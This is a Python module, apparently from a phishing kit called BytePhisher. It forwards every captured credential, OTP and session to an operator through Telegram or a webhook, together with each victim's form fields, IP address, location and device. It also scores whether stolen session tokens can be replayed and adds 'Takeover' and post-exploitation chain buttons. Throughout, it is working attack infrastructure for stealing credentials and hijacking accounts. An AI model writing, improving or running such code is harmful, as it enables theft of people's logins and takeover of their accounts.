# BytePhisher - real-time capture notifications.
#
# Fires on every credential/OTP capture so an operator gets an instant ping
# instead of polling the dashboard. Supports:
#   * Telegram bot API      (--telegram TOKEN:CHAT_ID)
#   * generic JSON webhook  (--webhook URL)  -> Discord, Slack, n8n, Mattermost...
# or any combination. Uses only urllib, so no extra dependencies.
#
# Never raises into the capture path: the HTTP handler wraps every call in
# try/except and notifications run on a daemon thread, so a dead webhook can
# never slow down or break a submission.

import threading
import time


def _redact(text, token):
    """Strip a bot token (or its secret half) from anything that reaches a log.

    Defect: urllib raises InvalidURL("nonnumeric port: '<secret>'") when the
    token lands in the URL host (a mis-set telegram_api_base), and _safe printed
    that message verbatim - the token secret is the one value that must never
    leak. Delegates to core.telegram.redact so both channels share one rule.
    """
    from . import telegram as _tg
    return _tg.redact(text, token)


def _as_int(value, default=0):
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def _as_float(value, default=0.0):
    try:
        return float(value)
    except (TypeError, ValueError):
        return default


def _as_dict(value):
    return value if isinstance(value, dict) else {}


def _as_list(value):
    return value if isinstance(value, list) else []


def format_chain(c):
    """One-message summary of a chain result (post-exploitation)."""
    lines = [f"[BytePhisher] CHAIN {c.get('chain')} "
             f"{'complete' if c.get('ok') else 'INCOMPLETE'}",
             f"session  : {c.get('sid')}",
             f"campaign : {c.get('campaign') or '-'}"]
    # Defect: tasks/findings/errors were sliced and iterated blind, so a chain
    # result whose field was a dict (not a list) raised TypeError inside the
    # alert path and the operator got nothing.
    for t in _as_list(c.get("tasks"))[:12]:
        if not isinstance(t, dict):
            continue
        lines.append(f"  {'ok ' if t.get('ok') else 'ERR'} {t.get('task')} "
                     f"{t.get('steps')} step(s)")
    hits = _as_list(c.get("findings"))
    if hits:
        lines.append(f"findings : {len(hits)}")
        for h in hits[:8]:
            if not isinstance(h, dict):
                continue
            lines.append(f"  {h.get('keyword')}: {str(h.get('line'))[:90]}")
    for e in _as_list(c.get("errors"))[:3]:
        lines.append(f"error    : {str(e)[:110]}")
    lines.append(f"again    : /chain {c.get('sid')} {c.get('chain')}")
    return "\n".join(lines)


def format_capture(c):
    """Human-readable one-message summary of a capture dict."""
    from . import risk as _risk
    c = _as_dict(c)
    if str(c.get("type") or "") == "chain":
        return format_chain(c)
    # Defect: int(risk) / localtime(ts) / fields.items() were called on raw
    # capture values, so a non-numeric ts or risk (a hand-written or malformed
    # capture) raised inside the alert and the message was lost.
    ts = time.strftime("%Y-%m-%d %H:%M:%S",
                       time.localtime(_as_float(c.get("ts"), time.time())))
    kind = "CREDENTIALS" if c.get("is_cred") else "FIELDS"
    r = _as_int(c.get("risk"), 0)
    reasons = "; ".join(str(x) for x in _as_list(c.get("risk_reasons")))
    lines = [
        f"[BytePhisher] {kind} captured",
        f"campaign : {c.get('campaign') or c.get('template') or '?'}",
        f"time     : {ts}",
        f"risk     : {r}/100 ({_risk.level(r)})"
        + (f" - {reasons}" if reasons else ""),
        f"ip       : {c.get('ip', '?')}",
        f"geo      : {', '.join(x for x in [c.get('city'), c.get('country')] if x) or '-'}",
        f"isp      : {c.get('isp') or '-'}",
        f"device   : {c.get('device', '?')}",
        "fields   : " + "; ".join(f"{k}={v}" for k, v in
                                  list(_as_dict(c.get("fields")).items())[:8]),
    ]
    tier = _token_tier_line(c)
    if tier:
        lines.append(f"tokens   : {tier}")
    return "\n".join(lines)


def _token_tier_line(c):
    """The token verdict, in the alert: whether the session is worth acting on NOW.

    A capture alert that says "tokens" and nothing else leaves the operator to discover, after
    the window closed, that the session was device-bound all along.
    """
    intel = _as_dict(c.get("token_intel"))
    if not intel:
        return ""
    bits = [str(intel.get("replayability") or "unknown")]
    if intel.get("device_bound"):
        bits.append("device-bound")
    if intel.get("cae_capable"):
        bits.append("CAE-aware")
    # Defect: tier0 rows were assumed to be dicts; a malformed entry raised
    # AttributeError and dropped the whole alert.
    open_paths = [row.get("path") for row in _as_list(intel.get("tier0"))
                  if isinstance(row, dict)
                  and row.get("verdict") in ("open", "needs_a_call")]
    if open_paths:
        bits.append("tier-0 in reach: " + ",".join(p for p in open_paths if p))
    return " | ".join(bits)

def _post_json(url, payload, timeout=8):
    """POST JSON via the IPv4-preferring transport (see core/net.py)."""
    from . import net
    return net.post_json(url, payload, timeout=timeout)

TELEGRAM_API_BASE = "https://api.telegram.org"   # overridable for tests

def send_telegram(token, chat_id, text, timeout=8, buttons=None,
                  retries=2, retry_base=0.5):
    """Send one message; `buttons` is [[(label, callback_data), ...], ...].

    The buttons are what turn an alert into an action: the operator taps
    "Takeover" instead of copying a session id out of the message.

    Transient failures (429 / 5xx / timeout / DNS) are retried with backoff; a
    permanent 4xx is not, because re-sending a bad request only wastes the
    window. The callback_data is capped to Telegram's 64-byte limit, or the
    whole alert would be rejected.
    """
    from . import telegram as _tg
    url = f"{TELEGRAM_API_BASE}/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "disable_web_page_preview": True}
    if buttons:
        payload["reply_markup"] = {"inline_keyboard": [
            [{"text": str(lbl), "callback_data": _tg._cap_callback(data)}
             for lbl, data in row]
            for row in buttons]}
    attempts = max(0, int(retries))
    for attempt in range(attempts + 1):
        try:
            return _post_json(url, payload, timeout)
        except Exception as e:
            if attempt >= attempts or not _tg.C2._retryable(e):
                raise
            time.sleep(min(float(retry_base) * (2 ** attempt), 30.0))

def send_webhook(url, c, text, timeout=8):
    # Discord wants `content`, Slack wants `text` - send both keys.
    return _post_json(url, {"content": text, "text": text,
                            "capture": c}, timeout)

def make_notifier(telegram=None, webhook=None, telegram_api=None, async_=True):
    """Build the on_capture callback.

    telegram: "TOKEN:CHAT_ID" (or a (token, chat_id) tuple)
    webhook:  full URL receiving a JSON POST
    telegram_api: override the API base (used by tests to point at a local stub)
    """
    token = chat_id = None
    if telegram:
        if isinstance(telegram, (tuple, list)):
            token, chat_id = telegram
        else:
            token, _, chat_id = str(telegram).partition(":")

    def _fire(c):
        text = format_capture(c)
        if token and chat_id:
            send_telegram(token, chat_id, text, buttons=_buttons_for(c))
        if webhook:
            send_webhook(webhook, c, text)

    def notify(c):
        if async_:
            threading.Thread(target=lambda: _safe(_fire, c, token), daemon=True).start()
        else:
            _safe(_fire, c, token)

    return notify

def _buttons_for(c):
    """Inline actions for a capture, when the capture is a session or a code.

    Nothing is offered for a plain field capture: there is no session to act on,
    and a dead button is worse than no button.
    """
    kind = str(c.get("type") or "")
    sid = c.get("session") or c.get("sid") or ""
    if not sid:
        return None
    if kind == "chain":
        return [[("Live", f"/live {sid}"), ("Session", f"/session {sid}")],
                [("Chain again", f"/chain {sid}")]]
    if kind not in ("session", "otp", "creds", "live"):
        return None
    from . import telegram as _tg
    return _tg.alert_buttons(sid, kind=kind)


def _safe(fn, c, token=None):
    """Never let a notification error escape (webhook down != lost capture).

    The exception text is redacted: a mis-set telegram_api_base makes urllib
    raise InvalidURL carrying the token, and this line is printed to the console
    and to any log the caller redirected stdout into.
    """
    try:
        fn(c)
    except Exception as e:
        print(_redact(f"[bytephisher] alert failed: {type(e).__name__}: {e}", token))
